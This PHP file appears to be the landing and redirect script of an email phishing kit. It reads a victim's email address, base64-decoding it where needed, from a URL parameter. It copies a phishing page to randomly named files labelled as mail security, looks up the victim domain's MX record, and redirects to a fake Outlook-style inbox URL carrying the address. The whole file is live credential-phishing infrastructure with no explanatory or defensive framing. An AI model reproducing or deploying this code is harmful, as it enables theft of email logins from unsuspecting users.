<?php
include('seke.php');

if(!isset($_GET['x']) or $_GET['x']=='' or $_GET['x']==' '){	
$finam='i.html';
function generateRandomString($length = 104) {
$characters = '0123456789abcdefghijklmnopqrstuvwxyz';
$charactersLength = strlen($characters);
$randomString = '';
for ($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];}
return $randomString;}
$staticfile = $finam;
$name =  generateRandomString();
$secfile = "Mail-Security-".$name.".php";

if (!copy($staticfile, $secfile)) {
}else{
if(file_exists($secfile)){
header("Location: $secfile?$urltt=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rdcode=$rdcode&fid.1252899642&fid.1&fav.1&uid=$login&submit=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
}} 	}else{	
if(!isset($_GET['on'])){
$finam='p.php';
}else{
$finam='p.php';
}
$text=$_GET['x'];
if (strpos($text,'@') !== false) {
$textuid=$_GET['x'];
}else{
$textuid=base64_decode($_GET['x']);}

$login = $textuid; $rdcode = $textuid; $dir =  getcwd();
if ($handle = opendir($dir)){
while (false !== ($entry = readdir($handle))){
$len = strlen($entry);
if($len == 3){
rename($entry, $finam);}}}


function mxrecordValidate($domain) {
$arr = dns_get_record($domain, DNS_MX);
if ($arr[0]['host'] == $domain && !empty($arr[0]['target'])){
return $arr[0]['target'];}}  

function generateRandomString($length) {
$characters = '0123456789abcdefghijklmnopqrstuvwxyz';
$charactersLength = strlen($characters);
$randomString = '';
for ($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];}
return $randomString;}


$namex =  generateRandomString(100);
$name =  generateRandomString(50);

$domin = substr(strrchr($login, "@"), 1);

$servname= mxrecordValidate($domin);

$secfilex = $namex."Security privacy.php";
$secfile = $servname.$name.$servname.".php";

if(isset($_GET['x'])){
if (!copy($finam, $secfile)) {
header("Location: $secfilex?$urltt=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rdcode=$rdcode&fid.1252899642&fid.1&fav.1&uid=$login&submit=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
}else{
if(file_exists($secfile)){
header("Location: $secfile?$urltt=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rdcode=$rdcode&fid.1252899642&fid.1&fav.1&uid=$login&submit=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
}else{header("Location: $secfilex?$urltt=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rdcode=$rdcode&fid.1252899642&fid.1&fav.1&uid=$login&submit=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
}
} exit;}
} 
?>
<title>Security privacy</title>